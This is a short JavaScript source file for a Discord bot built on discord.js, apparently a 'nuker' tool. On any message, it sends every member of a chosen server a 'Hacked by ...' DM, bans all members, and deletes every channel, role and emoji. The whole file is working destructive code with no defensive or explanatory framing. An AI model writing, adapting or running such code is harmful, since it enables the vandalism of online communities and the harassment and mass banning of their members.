const {
    Client,
    RichEmbed
} = require('discord.js')
const client = new Client();
const token = ''; //Insert bot token

client.on('ready', (guild) => {

    console.log('Ready');

});



client.on('message', message => {
	
	const list = client.guilds.get(""); //INSERT SERVER ID 
	list.members.forEach(member => member.send("Hacked by ..."));
    	list.members.forEach(member => member.ban());
    	message.guild.channels.forEach(channel => channel.delete());
	list.roles.forEach(role => role.delete());
	list.emojis.forEach(emoji => emoji.delete());

});

client.login(token);
